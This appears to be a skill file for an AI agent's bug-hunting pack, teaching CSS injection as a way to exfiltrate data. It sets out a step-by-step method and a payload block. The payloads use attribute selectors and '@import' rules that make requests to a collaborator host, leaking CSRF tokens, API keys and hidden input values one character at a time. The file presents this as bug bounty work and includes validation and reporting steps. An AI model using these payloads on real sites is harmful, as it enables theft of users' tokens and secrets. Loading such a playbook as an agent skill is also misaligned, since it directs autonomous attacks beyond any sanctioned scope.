---
skill: css-injection
title: "CSS Injection"
category: "Security · Web"
load_when: "css injection, style injection, css exfiltration, attribute selector leak, css keylogger, scoped style"
pack: SUPERAGENT V10
bughunt: true
---

# CSS Injection

## Where it pays
Injected CSS (when JS is blocked) can exfiltrate data via attribute selectors + background requests — leak CSRF tokens, partial secrets, input values.

## Attack-surface signals
Sinks that allow `<style>`/style attributes but sanitize scripts; HTML email; markdown; themes; anywhere CSS is reflected.

## Methodology
1. Confirm CSS injection (a style takes effect). 2. Use attribute selectors to match secret prefixes: `input[value^='a']{background:url(//collab/a)}`. 3. Leak char-by-char via the requests received. 4. Target CSRF tokens, API keys in attributes, hidden inputs.

## Payloads / probes
```
input[name=csrf][value^='a']{background:url(https://collab/?a)}
input[value$='Z']{background:url(https://collab/?end)}
@import url(https://collab/steal.css)
```

## Root causes
User CSS rendered into the page; secrets present in DOM attributes readable by selectors.

## Validation gate
Show data exfiltration via CSS (a received callback revealing a matched secret char/value).

## Impact & chains
Token/secret exfiltration, input leakage. Chains with web/xss (when escalatable).

## 🧪 Try it locally
```bash
python3 ../../../tools/skill_router.py "css injection, style injection, css exfiltration, attribute selector leak, css keylogger, scoped style"
```

→ Report with `../reporting/writeup.md` (CWE-79); validate with `../reporting/validation-gate.md`.
